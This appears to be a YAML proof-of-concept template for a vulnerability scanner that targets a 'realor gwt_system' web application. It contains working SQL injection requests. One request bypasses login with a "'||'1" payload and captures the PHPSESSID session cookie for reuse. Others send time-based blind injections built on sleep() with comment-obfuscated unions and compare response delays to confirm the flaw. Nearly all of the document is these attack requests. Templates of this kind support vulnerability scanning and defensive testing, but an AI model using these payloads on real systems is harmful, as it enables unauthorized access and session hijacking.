name: yaml-poc-realor-gwt_system-sql_injection-CT-683765
binding: ea40fe3a-3f4c-4300-8ab6-d7f7c26b4cee
detail:
    author: jiapeng.han
    links:
        - https://mp.weixin.qq.com/s/zeH6p5lFQ4kzu5HpfTpXog
    vulnerability:
        id: 0468851b-645a-477b-97df-0ca7fde906ed
        level: critical
    warning: Harmless
transport: http
set:
    sleepSecond1: randomInt(6, 8)
    sleepSecond2: randomInt(3, 5)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /ConsoleExternalUploadApi.XGI?key=FarmName&initParams=command_uploadAuthorizeKeyFile__user_admin%27-%27__pwd_password123__serverIdStr_1&sign=7627a11bf8f214451e7929f05299b9f6
        expression: response.body_string.contains("未查询到符合条件的用户")
    r1:
        request:
            cache: true
            method: GET
            path: /AgentBoard.XGI?user='||'1&cmd=UserLogin
        expression: response.body_string.contains("CustomInfo") && response.headers["Set-Cookie"].contains("PHPSESSID")
        output:
            search: |-
                "PHPSESSID=(?P<PHPSESSID>.*?);".submatch(response.headers["Set-Cookie"])
            PHPSESSID: search["PHPSESSID"]
    r2:
        request:
            cache: true
            method: GET
            path: /Board.XGI
            headers:
                Cookie: PHPSESSID={{PHPSESSID}}
        expression: response.body_string.contains('src="custom/')
    t0:
        request:
            cache: false
            method: GET
            path: /AgentBoard.XGI?user='||'1%27and%28select*from%28select%2F**%2Fsleep%280%29%29a%2F**%2Funion%2F**%2Fselect%2B1%29%3D%27&cmd=UserLogin
        expression: "true"
        output:
            r0latency: response.latency
    t1:
        request:
            cache: false
            method: GET
            path: /AgentBoard.XGI?user='||'1%27and%28select*from%28select%2F**%2Fsleep%28{{sleepSecond1}}%29%29a%2F**%2Funion%2F**%2Fselect%2B1%29%3D%27&cmd=UserLogin
            follow_redirects: false
        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000 && response.status == 200
    t2:
        request:
            cache: false
            method: GET
            path: /AgentBoard.XGI?user='||'1%27and%28select*from%28select%2F**%2Fsleep%28{{sleepSecond2}}%29%29a%2F**%2Funion%2F**%2Fselect%2B1%29%3D%27&cmd=UserLogin
            follow_redirects: false
        expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000 && response.status == 200
expression: r0() || r1() && r2() || t0() && t1() && t2()
